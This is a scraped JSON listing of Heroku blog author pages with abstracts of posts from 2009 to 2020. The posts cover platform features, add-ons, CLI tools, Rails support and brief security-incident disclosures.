{"website": "Heroku", "title": "Workers as first-class citizens", "author": ["Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich", "Oren Teich"], "link": "https://blog.heroku.com/authors/oren-teich", "abstract": "Running Rails on Heroku Update news March 13, 2013 Oren Teich On February 16th, we published a blog post outlining five specific and immediate actions we would take to improve our Rails customers' experience with Heroku. We want to provide you with an update on where these things stand. As a reminder, here’s what we committed to do: Improve our documentation so that it accurately reflects how our service works across both Bamboo and Cedar stacks Remove incorrect and confusing metrics reported by Heroku or partner services like New Relic Add metrics that let customers determine queuing impact on application response times Provide additional tools that developers can use to augment our latency and queuing metrics Work to better support... Read more Bamboo Routing Performance news February 14, 2013 Oren Teich Yesterday, one of our customers let us know about significant performance issues they have experienced on Heroku. They raised an important issue and I want to let our community know about it. In short, Ruby on Rails apps running on Bamboo have experienced a degradation in performance over the past 3 years as we have scaled. We failed to explain how our product works. We failed to help our customers scale. We failed our community at large. I want to personally apologize, and commit to resolving this issue. Our goal is to make Heroku the best platform for all developers. In this case, we did not succeed. But we will make it right. Here’s what we are working on now: Posting an in-depth... Read more Cross-Site Request Forgery Vulnerability Resolution news January 25, 2013 Oren Teich On Friday January 18, security researcher Benjamin Manns notified Heroku of a security vulnerability related to our add-ons program. At a high level, the vulnerability could have resulted in disclosing our Cross-Site Request Forgery tokens (these tokens are used to prevent browser hijacking) to third parties. We quickly addressed the vulnerability and on Sunday, we deployed a patch to remediate the issue. We also reviewed our code for related vulnerabilities and conducted a review of our audit logs to determine the impact of the vulnerability. We found no instances of this issue being exploited. We wish to thank Mr. Manns for his work and commitment to responsible disclosure. You can... Read more Password Hijacking Security Vulnerability and Response news January 09, 2013 Oren Teich Heroku recently learned of and resolved a security vulnerability. We want to report this to you, describe how we responded to the incident, and reiterate our commitment to constantly improving the security and integrity of your data and source code. On December 19, 2012, security researcher Stephen Sclafani notified us of an issue in our account creation system. Using a maliciously-crafted HTTP request, an attacker could change the password of a pre-existing Heroku user account, and thus gain control of it. This attack would not disclose the pre-existing password to the attacker (those are stored internally as non-recoverable bcrypt hashes). Upon receiving notification, our engineering... Read more Hosting San Francisco Rails 3.1 Hackfest news July 18, 2011 Oren Teich The rails community is making the final push to get 3.1 out and is looking for your help! As part of a worldwide effort over the weekend, Heroku is hosting a local hackfest to help finalize Rails 3.1. On Saturday, July 23rd from 12pm to 5pm, Heroku will be hosting a gathering for the Rails 3.1 Hackfest . We're looking for people that want to improve things at all levels of the Rails stack - from debugging to documentation. Come with apps to upgrade to Rails 3.1. We'll also be working on getting Rails 3.1 apps running on Heroku's Celadon Cedar stack. If you haven't done this yet, don't miss the opportunity! The Rails 3.1 Hackfest will be at our San Francisco office: 321... Read more Post-mortem on April 21 Outage news April 26, 2011 Oren Teich On April 21st 2011, Heroku experienced a widespread application outage. We have posted a full post-mortem detailing the causes and steps we are taking to prevent similar outages from happening in the future. Heroku status always contains our current status. You can follow @herokustatus to follow status updates via twitter. Read more An update on Heroku Node.js support news September 20, 2010 Oren Teich UPDATE : Node.JS is now officially available on Heroku. In April we released experimental support for Node.js . Response was instant and overwhelming. Now, nearly 1,000 people are using Node.js on Heroku. The goal of the experiment was to understand what it would take to run Node.js in the most Heroku way possible. The experiment was extremely successful. People have built great apps, provided feedback, and engaged in ways beyond our expectations. Three of the key requests we’ve heard are: Support for long connections, beyond a 30 second timeout HTTP 1.1 and websockets Scaling Node.js as easily as Ruby While we work on the next version incorporating these features and more, we are... Read more Enterprise Social Apps news August 31, 2010 Oren Teich With over 80,000 applications on Heroku, we are frequently asked what type of apps people are building. While there’s a wide range , one of the areas I’ve been most excited about is social apps. We have thousands of social applications around Twitter, Facebook, and other platforms. The Social App Workshop last month was proof of the interest with a sold out crowd of over 150 people filling a basement on a great summer Saturday. Social platforms are sweeping enterprises as well. From internal communities for collaboration to external communities with millions of users, enterprises are finding social software essential to how they work. Today we’re announcing a partnership... Read more Social App Workshop Videos news August 20, 2010 Oren Teich Last month’s Social App Workshop was a huge success. With a sold out crowd of over 150 people filling the basement of our new office, a great lineup of presenters and some fun coding in the afternoon it surpassed our expectations. Social App Workshop is a hacker event for new and experienced developers working on Twitter & Facebook apps. With a combination of presentations and coding the workshop brings developers together to work on social apps. The morning was spent with a combination of 10 min talks and 30 min talks from Facebook , Twitter , Heroku , Apigee , Twilio , and Abraham Williams . After getting everyone amped up in the morning, we broke into groups in the afternoon to... Read more Bundler Status Update news August 12, 2010 Oren Teich Bundler is quickly shaping up to meet all it’s promise as THE best way to manage your application dependencies. This afternoon we updated Heroku to the latest version – 1.0.0RC5. RC5 addresses all known outstanding issues including the git sourced gems . You can see a full changelog on github . One key problem Bundler was designed to address was the shifting sands of various gems updating and changing dependencies. As many of you have probably found in the past before Bundler, deploying could unexpectedly install new versions of gems on you, breaking your application. Bundler has added a new flag: “—deployment” for this very issue. When you run “bundle... Read more Blasting through Brazil news August 02, 2010 Oren Teich Our own Brazilian Pedro Belo will be making two stops in Brazil the first half of August. August 6th and 7th he’ll be speaking at the Oxente Rails 2010 conference. On August 8th he’ll be joining a local meetup in Sao Paulo to talk Ruby, Heroku and Beer. If you’d like to join the meetup in São Paulo, drop Pedro a note for the location details. Ansioso para vê-lo! Read more Default to Bamboo news June 29, 2010 Oren Teich Deployment stacks have been a huge success. For many developers, heroku create —stack bamboo has become the default whenever creating new apps. With the latest version of Rails 2 and Rails 3 both requiring the Bamboo stack, we’re excited to make Bamboo the new default. Effective immediately, all newly created apps will default to the bamboo stack with REE 1.8.7. You can still use the old aspen stack if you’d like by simply specifying `heroku create —stack aspen`. Existing apps stay on the stack they are on unless you explicitly migrate them . A key feature of bamboo is to eliminate pre-installed gems. This provides app developers with considerably more flexibility... Read more Rails 3 Beta 4 on Heroku news June 15, 2010 Oren Teich Heroku now supports Rails 3 beta 4 with Ruby 1.8.7. Make sure to push up to bamboo , and you should be all set! As Rails 3 matures and gets closer to production a number of pieces continue to change. The beta 4 update introduced two significant changes to be aware of: Require Ruby 1.8.7 > p249 or Ruby 1.9.2. Require Bundler 0.9.26. Heroku has updated to Ruby REE 1.8.7-2010.02 which incorporates the necessary patches for Rails 3. We will add support for 1.9.2 when the community releases the official release. In the meantime, developers interested in using Rails 3 on Heroku must use Ruby 1.8.7. We have also updated to the latest stable release of Bundler: 0.9.26. We will continue to... Read more MongoHQ Add-on Public Beta news April 30, 2010 Oren Teich Let’s cut straight to the chase: MongoHQ is launching their add-on to all Heroku users as a public beta. The details Over the last six months we have seen persistent demand for MongoDB support on Heroku, so we are incredibly excited that MongoHQ is releasing their highly anticipated add-on into public beta today. The add-on interfaces seamlessly with their successful hosted service, and allows developers to use MongoDB as a first-class-citizen data store in any of their Heroku apps. Using it is just as easy as you’ve come to expect from Heroku: simply add the add-on, and you’re good to go! The first available plan is free and includes one database up to 16MB. Soon, you... Read more Supporting Large Data: Part 1 news April 21, 2010 Oren Teich As apps have matured on Heroku, data sets have gotten much larger. Taps is designed to help development by providing a fast and easy way to transfer databases between local environments and Heroku. Today we launched taps 0.3 with a reworked architecture and a new set of features focused on large data sets: Push/Pull Specific Tables You can now choose which tables to push and pull. Specify a regex and taps will only push or pull the tables that match. To only pull specific tables, specify a comma delimited list. For example, to pull the logs and tags tables, run this command: heroku db:pull --tables logs,tags Resume Transfers Interruptions can happen when moving large datasets.... Read more Sinatra 1.0 Released news March 24, 2010 Oren Teich Sinatra is one of our favorite frameworks at Heroku. Many of our apps use Sinatra, and Blake even works here. All this means we’re extremely excited to congratulate the Sinatra team on the 1.0 release! You can use Sinatra 1.0 today on Heroku. It works with both the Aspen and Bamboo stacks . Simply add the gem to your .gems file, git push, and you’ll be running Sinatra 1.0! Read more Memcached Public Beta news March 16, 2010 Oren Teich The top open request from our recent survey has been for memcached. Memcached is a simple, fast and scalable in-memory object caching system. Dynamic web applications use memcached to store frequently used data, reducing database load. The Heroku memcached add-on is built on the NorthScale distribution of memcached ( NorthScale Memcached Server ) which includes an advanced, per-user security model. The service is fully managed by NorthScale – a company formed and run by leaders of the memcached open source project. All Heroku users can use the add-on today. Read the docs for full details on getting started and add away . We’ll be using this beta period to analyze usage, determine... Read more Heroku Casts: Queue Depth & New Relic news March 08, 2010 Oren Teich New Relic RPM is an on-demand performance management solution for web applications developed in Ruby. New Relic recently introduced an updated agent . Some of the highlights include support for Sinatra and rack apps, as well as background workers. They also added a great Heroku feature; you can now view your backlog depth history. When a request comes in to Heroku it’s passed to your dynos to process the request. If more requests are coming in than your dynos can handle, the requests queue up. Our docs provide a more detailed overview of performance. The queue is often a sign that you need to increase your dynos or speed up your app. New Relic can now show you the peak and average... Read more Public Beta: Deployment Stacks news March 05, 2010 Oren Teich Heroku Apps run on a fully curated stack with everything from the front end caching to the base libraries selected and managed. Today, we’re making available an additional curated stack, with updated libraries and Ruby VMs. You now have the choice of running on the original “Aspen” stack, or using the new “Bamboo” stack. Both are first class citizens and the choice on which to use is yours to make. With a single simple command, you can migrate existing apps back and forth between stacks, or deploy new apps to this updated stack. Best of all, as part of the new stack, you also have a choice of Ruby VM between Ruby REE 1.8.7 and Ruby MRI 1.9.1. And yes, you... Read more Winter 2009 Survey Results news February 23, 2010 Oren Teich In December we asked our users to take a survey on how they are using Heroku. After collecting the responses, we wanted to share some of the results with the rest of our user community. Who’s using Heroku? No surprise, but the majority identify themselves as in the “Software Technology” industry, at 65% of the respondents. The rest of the user base is divided between many groups, from Consultancies with 9%%, to the Arts & Entertainment industry with 6%% and Healthcare at 2.5%%. Respondents reported annual web application budgets as high as $10M/year, with over 13% spending >$100K/annually. How are they using Heroku? These users are building a huge range of... Read more Gem Bundler on Heroku news February 16, 2010 Oren Teich Gem Bundler is rapidly on its way to becoming the new community standard for managing gem dependencies in Ruby apps. Bundler is the default gem manager for Rails 3, but it will also work seamlessly with any other web framework (or no framework) since it has no dependencies itself. Using it is as simple as creating a Gemfile in the root of your app: source :gemcutter gem 'sinatra', '0.9.4' gem 'haml', '2.2.17' …and running “bundle install” at the command line, which sets up all of your gems. Yehuda Katz has a writeup on using bundler that outlines various scenarios for using bundler. Heroku now has native support for gem bundler. If you push up a repo that has a Gemfile... Read more Heroku Casts: Windows Setup news January 28, 2010 Oren Teich Getting the entire ruby stack up and running on Windows is a bit tricky. To help out the process we’ve posted a new Windows setup docs page . This 10 minute screencast walks you through the process. It follows the outstanding instructions put together by Sarah Mei for the Ruby on Rails Workshops Read more Manage Heroku with your iPhone news January 26, 2010 Oren Teich You get a call from your partner that your app just hit the front page of Digg. You’re away from your computer, and need to scale your app up now! Fire up Nezumi and dial your dynos to 12 to handle the load no problem. Nezumi is a 3rd party iPhone app that allows you to perform almost any of the functions that the CLI supports, from restarting your app, changing your dynos and workers, viewing logs, adding collaborators, and much more. It’s available now from the iTunes store. Marshall , the developer of Nezumi, was kind enough to provide us 5 copies of Nezumi to give away. Leave a comment below, and on Friday we’ll select 5 people from random and email you a promo code... Read more Success Story: FlightCaster news December 15, 2009 Oren Teich Last month’s featured app was FlightCaster . FlightCaster provides flight delay prediction, letting you know 6 hours in advance if your flight is delayed. Today we’ve posted their success story , along with a great video with their CEO , Jason Freedman. Jason goes into some great details on how they use Heroku to handle their complex application, including using a Hadoop cluster to process millions of updates. In his words, “Heroku has enabled us to deliver a world class service without having the huge management and operational overhead we would have otherwise needed.” Watch the video below, or click on through to the whole success story . For more technical details,... Read more Success Story: Best Buy IdeaX news December 11, 2009 Oren Teich This month’s featured app is Best Buy IdeaX , developed by Bust Out Solutions . Best Buy IdeaX is a forum for Best Buy customers to share, rate, and discuss ideas to help make Best Buy better. “We were very interested in running IdeaX on a cloud computing infrastructure such as Amazon EC2, but the cost of maintaining our own EC2 instances was just too high, not to mention frustrating. Heroku solves those problems for us with their solid platform infrastructure and nice user interface. We’re saving time and money, and enjoying development much more.” said Jeff Linn, Founder/ CEO of Bust Out Solutions Check out the Success Story and the live Best Buy IdeaX site . Read more DJ has evolved into Workers news December 02, 2009 Oren Teich Modern web apps are increasingly making use of asynchronous, background workers for task processing needs. For many apps, workers are just as, if not even more important than the front end http stack. Ever since we launched DJ , we’ve been overwhelmed with requests from customers wanting access to several DJ workers per app. Based on the feedback, we have been coding away, making this happen, and today we’re proud to announce the release of Heroku Workers. Workers as first-class citizens The new Workers feature is based on Delayed Job, and will replace the current DJ add-on, which is retired. The major change here is that Workers are a first-class citizen on the Heroku platform... Read more New Relic RPM Silver & Gold Add-on news December 01, 2009 Oren Teich A couple of weeks ago we announced that New Relic RPM Bronze is available free of charge for all Heroku customers through the our add-on catalog New Relic RPM is a application performance management tool that allows you to monitor, troubleshoot, and tune the performance of your Heroku app. One-click integration with the Heroku platform means that you can activate an RPM account and start monitoring your application in just minutes. Here’s more great news: now you can upgrade to RPM Silver or RPM Gold, through the same add-on catalog . RPM Silver and Gold are charged per dyno-hour, so it’s only based on your actual usage of Heroku. RPM Silver enables error tracking and... Read more Tech: Sending email with Gmail news November 09, 2009 Oren Teich These days, it seems like almost all apps need to send email. And everyone has a gmail account. So why not have your app send email through Gmail? It’s fairly easy with just a few steps. Heroku currently runs Ruby 1.8.6. This means you need to provide your own SMTP TLS library. Luckily, Adam has made that super easy with a quick little Rails plugin . Simply install the library, set a few config variables , and you’re good to go. Best of all, this simple plugin will work on any provider. Use it even if you’re not on Heroku. It’s just a fast way to make sure your SMTP connection to Gmail is setup correctly. 1. Install the plugin $ script/plugin install... Read more Add-ons Launch news October 29, 2009 Oren Teich Heroku has focused since day one on making the end-to-end application experience as easy as possible. From our git focused workflow to the automated management of deployed applications, we’ve worked hard to give developers the flexibility to build amazing apps. Today we’re excited to announce a major extension of this flexibility with Add-ons . For those who just want to see it in action, here’s a 3 minute overview: Add-ons Add-ons are a way to extend your application. They can provide core functionality (like full-text search or cron ), add features to the platform (like deploy hooks or backup bundles ), and integrate with amazing third party services (like Zerigo , ... Read more Heroku Casts: Maintenance Mode news October 19, 2009 Oren Teich Today we’re launching an exciting new feature – maintenance mode. We strive to make your deployment and management experience as seamless as possible, for both the developers and the end users. Part of any management task is performing routine maintenance tasks, from database migrations to more complex site upgrades. When you’re in the midst of doing these maintenance tasks, wouldn’t it be great to show your users a nice maintenance page, instead of a broken site? With the Heroku maintenance mode, now you can. This quick 3:30 video shows you how to use maintenance mode, and even how to customize it for your own look and feel: Read more Heroku Casts: Setting Up Custom Domains news October 07, 2009 Oren Teich NOTE : This documentation is out-of-date and no longer supported. It will not work with the current version of the Heroku platform. For the latest information about setting up custom domains on Heroku please use this article from the Heroku Dev Center. Today is a twofer on the screencast front. Setting up custom domains & DNS is one of those necessary evils that no one likes, and is way more confusing than it should be. Adding insult to injury, there’s not one solution for all cases. At a high level, the process is fairly easy. First, you need to point your domain to Heroku with your DNS provider (such as GoDaddy). Once your domain is pointed to Heroku, you then need to tell... Read more Heroku Casts: Creating Your First App news October 06, 2009 Oren Teich We’re introducing a series of screencasts going over how Heroku works, how to use it, and some common ways to make your experience better. To kick this off, I’ve put together a quick <5 minute overview of creating your first Heroku application. Follow all our videos on our vimeo page If you’ve got ideas on other screencasts you’d like to see, let us know in the comments! Read more The best camera is... news September 25, 2009 Oren Teich We periodically like to highlight some of the great applications people are building on Heroku. This week, a new web site and iPhone app for shutterbugs launched , and it’s getting great press and feedback around the web . Chase Jarvis , a professional photographer, has been singing the praises of the iPhone camera as creative outlet. As he points out, the best camera is the one you have with you. To back that claim up, he’s launched a new project combining an iPhone application and community website. When I saw that this was running on Heroku, I knew I had to find out more. I reached out to the developers behind this project: Übermind . I dropped the mad geniuses over there a... Read more Our travels continue news September 10, 2009 Oren Teich In our ongoing efforts to spread the Heroku word worldwide , our North American tour continues with a bunch of new venues coming up. Each time we meet with people, we’re blown away with the new applications people are creating on Heroku. For example, last month FlightCaster launched an amazing app for predicting flight delays using Heroku, Clojure, S3, Hadoop and some general amazing tech. We’d love to hear from you on what you’re creating, and find out how to make some awesome stuff. Blake Mizerany continues his travel schedule talking about Heroku, Sinatra, Ruby development and scaling. If you’re in the area, make sure to stop by! Boston.rb – Sept 8, 2009 ... Read more BizConf Bound news August 18, 2009 Oren Teich Heroku has a special place in our heart for consultants and web development firms. They’re some of our best supporters and users. That’s why were excited to be heading out to BizConf this Thursday and Friday. From the BizConf website: It’s simple: energetic, enthused folks who want to learn more about how to actually do business today. This conference won’t consist of get-rich-quick talks or motivational speeches, but rather in-depth presentations, discussions and workshops on how to communicate, manage and network more dynamically and effectively. If you’re going to be at BizConf, find me or drop me an email to arrange something. I’ll have some... Read more Heroku Sass news August 17, 2009 Oren Teich No, we’re not talking back. Instead, we’re excited to announce that you can now use Sass on Heroku. We’re big believers in elegance here, and Sass is a way to bring elegance to your CSS and page layout. Due to our read-only filesystem Sass hasn’t worked well on Heroku. Thanks to the efforts of one of our awesome engineers , there’s now a beta plugin available that enables you to use Sass & Heroku frictionlessly. To use the plugin, install Sass as you normally would – include the HAML gem in your gem manifest. Then, script/plugin install the sass_on_heroku plugin: $ script/plugin install git://github.com/heroku/sass_on_heroku.git The plugin compiles... Read more Bringing Heroku to the East Coast news August 03, 2009 Oren Teich With Morten out on the European tour , we didn’t want those here in the US to feel left out. Last week we attended a great BBQ and roundtable with Seattle.rb . Starting next week, we’ll be heading out to the east coast, and want to meet more of you. Blake Mizerany will be talking with local meetup groups all along the east coast about Heroku, Sinatra, and Ruby development. We’re excited to hear how you’re using Heroku today, and what you’d like to see from us in the future. We’re currently bookending the trip with two bigger groups: kicking it off with NYC .rb on August 11th, and ending the tour at Boston.rb on September 8th. Have a meetup group, on the... Read more", "date": "2013-03-13,"},
{"website": "Heroku", "title": null, "author": ["Nicolas Pujol"], "link": "https://blog.heroku.com/authors/nicolas-pujol", "abstract": "2X Dynos in Public Beta news April 05, 2013 Nicolas Pujol A dyno , the unit of computing power on Heroku, is a lightweight container running a single user-specified command. Today we’re announcing a dyno with twice the capacity: 2X dynos. Existing dynos are now called 1X dynos. They come with 512MB of memory and 1x CPU share. They cost $0.05/hr. 2X dynos are exactly what their name implies: 1GB of memory and twice the CPU share for $0.10/hr. To support the growth of current and future apps on the platform, you can now control your dyno resources on two axes: size and quantity. Let’s try them out. Getting started with 2X dynos Using the Heroku Toolbelt , resize your dynos with the resize command: $ heroku ps:resize web=2X worker=1X Resizing... Read more", "date": "2013-04-05,"},
{"website": "Heroku", "title": null, "author": ["Nick Tassone"], "link": "https://blog.heroku.com/authors/nick-tassone", "abstract": "Gemcutter's Adventure on Heroku news October 05, 2009 Nick Tassone Hi there, I’m the creator of a new RubyGem hosting site, Gemcutter . I also happen to be one of the newest hires at Heroku, but I promise, I decided the project was going to be hosted on Heroku long before starting to work here. Heroku’s been kind enough to pitch in getting the site deployed and ready for the whole Ruby community to enjoy. There’s nothing more fitting than for the next generation of RubyGem hosts to be supported by a truly next generation web application hosting platform. The project has the following goals: Provide a better API for dealing with gems Create more transparent and accessible project pages Enable the community to improve and enhance the... Read more", "date": "2009-10-05,"},
{"website": "Heroku", "title": null, "author": ["Email", "Neil Fredrickson"], "link": "https://blog.heroku.com/authors/neil-fredrickson", "abstract": "Electric’s Advice During Uncertain Times: Invest in Your Culture life June 23, 2020 Neil Fredrickson Some say that the only constant in life is change. That may be true, but often what’s more important than the change itself is how we react. We all go through life trying to manage change (albeit with varying degrees of success), so we can better cope with it, learn from it, and adapt. Like individuals, organizations can learn the same “life skill,” so that change is not only less disruptive, but it also becomes a measure of organizational health that can lead to success. Sometimes, it takes a pandemic Times of sudden change, like during the COVID-19 crisis, are especially tough on everyone. Most companies are scrambling to figure out their “new normal;” employees and teams are... Read more", "date": "2020-06-23,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "LinkedIn", "Nahid Samsami", "Nahid Samsami", "Nahid Samsami", "Nahid Samsami", "Nahid Samsami", "Nahid Samsami", "Nahid Samsami", "Nahid Samsami", "Nahid Samsami"], "link": "https://blog.heroku.com/authors/nahid-samsami", "abstract": "Announcing Heroku CLI Autocomplete for Bash and Zsh news May 24, 2018 Nahid Samsami Today we're excited to announce that Heroku CLI Autocomplete for Bash and Zsh is generally available. Heroku CLI Autocomplete makes your workflow faster and more seamless by helping you complete command and flag names when you press the tab key. Autocomplete completes all Heroku CLI commands and will automatically support new commands as they are added. You can also complete values for some flags and args—including apps, pipelines and config vars—so you won't need to run multiple commands to find and cross-reference them. We build the CLI first and foremost for human usability; Autocomplete takes usability a step further, making it easier than ever to discover, learn, and... Read more Heroku Webhooks: Easier Accessibility, More Options news May 03, 2018 Nahid Samsami Heroku Webhooks let you create powerful real-time integrations and drive custom operations workflows whenever your Heroku app changes. Today, we're excited to announce a new user experience that makes managing and creating webhooks easier than ever. Now everyone on your team can create a webhook, update it and see deliverability, using a straightforward interface in the Heroku Dashboard. Until now, app webhooks functionality was only available through the Heroku CLI. How to Find the Dashboard Interface for app webhooks You can find the new webhooks interface by going to the Dashboard view for an app, clicking on “More” on the right hand side of the page, and then selecting “View... Read more Open Sourcing oclif, the CLI Framework that Powers Our CLIs news March 20, 2018 Nahid Samsami Today we're excited to announce that we've open sourced oclif , a framework for building command line interfaces. We built oclif to serve as the common foundation for both the Heroku and Salesforce CLIs and to abstract away the common struggles. The framework is now available to any developer for building CLIs large or small. oclif makes building CLIs more accessible by providing you with the patterns and tools to scaffold a working command line interface. It provides a structure for simple to advanced CLIs, including documentation, testing, and plugins for adding new commands. With oclif you can get up and running with your command line interface quickly, and focus on the... Read more Announcing the New Heroku Partner Portal for Add-ons news January 11, 2018 Nahid Samsami We are excited to announce that the new Heroku Partner Portal for Add-ons is now generally available. The new portal offers an improved partner experience for building, managing, and updating Heroku add-ons. Our goal is to create a workflow that will give you more freedom and enable you to bring your add-ons to market more easily. The new portal has been organized into a simple, elegant interface that is similar to the rest of Heroku's products. In each section, we've made more functionality available via the portal interface, where in the past emails or support tickets might have been necessary. This release brings a more visual approach as well as greater focus to creating and... Read more Heroku Webhooks: Powering New Integrations and Real-time Notifications news August 22, 2017 Nahid Samsami We're happy to announce that Heroku app webhooks is now generally available for all Heroku customers. App webhooks provide notifications when your Heroku app changes, including modifications to domain settings, releases, add-ons, and dyno formations. These notifications can empower your internal communications, dashboards, bots or anything else that can receive HTTP POST requests. Integrating with Heroku webhooks provides easy support for driving custom workflows and 3rd party tools. Creating webhooks With the webhooks CLI plugin, you can subscribe to events with a single command. heroku plugins:install heroku-webhooks heroku webhooks:add -i api:release -l notify -u... Read more Announcing Platform API for Partners news May 25, 2017 Nahid Samsami Heroku has always made it easy for you to extend your apps with add-ons. Starting today, partners can access the Platform API to build a more secure and cohesive developer experience between add-ons and Heroku. Advancing the Add-on User Experience Several add-ons are already using the new Platform API for Partners. Adept Scale , a long-time add-on in our marketplace that provides automated scaling of Heroku dynos, has updated its integration to offer a stronger security stance, with properly scoped access to each app it is added to. Existing customer integrations have been updated as of Friday May 12th. All new installs of Adept Scale will use the more secure, scoped Platform API. ... Read more Announcing the New Heroku CLI: Performance and Readability Enhancements news December 15, 2016 Nahid Samsami Today we are announcing the newest version of the Heroku CLI . We know how much time you spend in the CLI as developers and how much pride you take in being able to get things done quickly. Our new CLI has big improvements in performance as well as enhanced readability for humans and machines. Tuned for Performance CLI response time is made up of two parts: the API response time and the performance of the CLI itself, and the latter is where we’ve made big improvements. While a typical Unix user should experience responses that are around half a second faster, the biggest gains are for Windows users, as the new CLI no longer has a Ruby wrapper. When we measured the time it takes for the... Read more Sunsetting Heroku’s Legacy Platform API (v2) news April 04, 2016 Nahid Samsami Two years ago we released the Heroku Platform API (v3), providing a supported way to automate and instrument Heroku and making it even easier for you to build new products. Today we are deprecating the legacy, unofficial version of the API that preceded it (v2), as its usage is limited and we are focusing development on the newer, officially-supported API. We will sunset v2 of the API on April 15, 2017. For security reasons, we will be sunsetting support of auth in query string sooner, which we will announce in the Changelog . If you are using the older version of the API, we recommend transitioning to v3 as soon as possible . Please reach out to us through support if you have any... Read more Introducing Add-on Controls: Standardize Add-ons for Your Team news February 25, 2016 Nahid Samsami Today we are introducing Add-on Controls for Heroku Enterprise customers. This new feature enables team leads to allowlist specific add-ons for approved use within their organization, choosing from our marketplace of over 150 add-on services. The ability to standardize the add-on technologies being used across all the apps and developers in their organization is something many customers have asked for, especially those with fast-growing teams. Standardizing Add-ons Using the Allowlist To get started with Add-on Controls, the first step is for the team lead, or anyone who has admin permissions, to build the Add-ons Allowlist. There is a new section on the organization’s settings page,... Read more", "date": "2018-05-24,"},
{"website": "Heroku", "title": null, "author": ["Facebook", "GitHub", "LinkedIn", "Michelle Peot", "Michelle Peot", "Michelle Peot"], "link": "https://blog.heroku.com/authors/michelle-peot", "abstract": "Announcing Heroku ChatOps for Slack news July 25, 2017 Michelle Peot Today we’re making our Slack integration generally available to all Heroku customers through the release of Heroku ChatOps. ChatOps is transforming the way dev teams work, replacing the asynchronous communication and context-switching of traditional operations processes with a shared conversational environment so teams can stay focused, communicate in real-time, gain visibility, and speed joint decision making. Having seen the benefits of Slack integration for managing our own apps, we wanted to make ChatOps easier to use and accessible to every dev team. Heroku ChatOps handles the complexity of user onboarding, authentication, and accountability between Slack & Heroku, and provides... Read more Announcing Heroku Autoscaling for Web Dynos news January 24, 2017 Michelle Peot We’re excited to announce that Heroku Autoscaling is now generally available for apps using web dynos. We’ve always made it seamless and simple to scale apps on Heroku - just move the slider. But we want to go further, and help you in the face of unexpected demand spikes or intermittent activity. Part of our core mission is delivering a first-class operational experience that provides proactive notifications, guidance, and—where appropriate—automated responses to particular application events. Today we take another big step forward in that mission with the introduction of Autoscaling. Autoscaling makes it effortless to meet demand by horizontally scaling your web dynos based on what’s... Read more Threshold Alerting for Application Metrics Now Generally Available news August 02, 2016 Michelle Peot Today we're announcing two new features that will help you better manage and run apps on Heroku: Threshold Alerting and Hobby dyno metrics. Threshold Alerting provides the ability to set notification thresholds for key performance and health indicators of your app. We’ve also extended basic Application Metrics to Hobby dynos to provide basic health monitoring and application guidance. Together these features allow you to stay focused on building functionality by letting the platform handle your app monitoring. Threshold Alerting There are many ways to measure the health of an application. The new alerting feature focuses on what is most important to the end users of your app:... Read more", "date": "2017-07-25,"},
{"website": "Heroku", "title": " ", "author": ["Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai", "Morten Bagai"], "link": "https://blog.heroku.com/authors/morten-bagai", "abstract": "RabbitMQ Add-on Now Available on Heroku news August 31, 2011 Morten Bagai Today we're proud to announce the availability in beta of RabbitMQ add-on by VMWare . RabbitMQ is an open source implementation of the AMQP protocol that provides a robust, scalable and easy-to-use messaging system built for the needs of cloud application developers. Getting Started With the add-on, provisioning a fully managed RabbitMQ instance couldn't be easier to do: $ cd rabbitdemo $ heroku addons:add rabbitmq -----> Adding rabbitmq to rabbitdemo... done, v2 (free) $ heroku config RABBITMQ_URL => amqp://uname:pwd@host.heroku.srs.rabbitmq.com:13029/vhost Your application's environment will now have the RABBITMQ_URL set pointing to your new instance. Most modern... Read more Apigee Add-on for Twitter Public Beta news May 27, 2010 Morten Bagai If you develop apps for Twitter, this is the add-on for you. The Apigee for Twitter Add-on allows developers to easily access Twitter REST api’s. Through a direct relationship with Twitter, Apigee can offer users of the Add-on vastly increased rate limits automatically. The goal is to ensure that no valid application hits rate limits at all. If you’re developing applications using the Twitter REST api, check out the add-on today. Using it is often as simple as changing your app to use the apigee provided config var endpoint instead of “api.twitter.com”. Full docs are available here , and as always please let us know how it works for you. Read more Rails 2.3.6+ Dependency Issues news May 25, 2010 Morten Bagai This past Sunday, Rails 2.3.6 was released , and quickly followed by 2.3.7 and 2.3.8. One of the major changes in these new versions is to require a newer version of Rack, specifically 1.1.0, that is incompatible with Rails 2.3.5 and older. Due to the fairly complex ways in which Rubygems resolves dependencies, this can prevent your app from starting – in your local environment as well as when deployed on Heroku. If you’ve been affected by this issue, you would see this error message: Missing the Rails gem. Please `gem install -v= x.x.x`, update your RAILS_GEM_VERSION setting in config/environment.rb for the Rails version you do have installed, or comment out RAILS_GEM_VERSION... Read more Node.js Feedback news April 29, 2010 Morten Bagai The response to yesterday’s Node.js announcement continues to be absolutely amazing. First and foremost, we’re thrilled to see the community share our excitement about Node.js and its potential on the Heroku platform. We do, however, also want to be mindful that we’re still in the experimental phase with this technology here. For this reason, we’re going to proceed carefully and invite testers in small batches. So, if you don’t hear from us right away, despair not. It’ll likely take us a few weeks to get through the current list, and if you’re reading this for the first time, please don’t hesitate to register your interest at... Read more SSL Hostname Add-on Public Beta news March 30, 2010 Morten Bagai Ever since we launched the current IP-based solution at $100/month in response to customer demand, we have been pursuing a cheaper and more elegant solution for SSL with custom certificates on Heroku. Today, we’re happy to announce the public beta of a new SSL add-on that accomplishes this goal. It’s called ssl:hostname , and is priced at $20/month. This new add-on will allow you enable SSL traffic to your application on any subdomain, such as www.mydomain.com or secure.mydomain.com, using your own SSL certificate. Note that this is a paid beta, and you will be charged for using the add-on through the beta period. Full docs are available here . You can install it via the heroku... Read more We're Hiring! news September 28, 2009 Morten Bagai Thanks to the continued 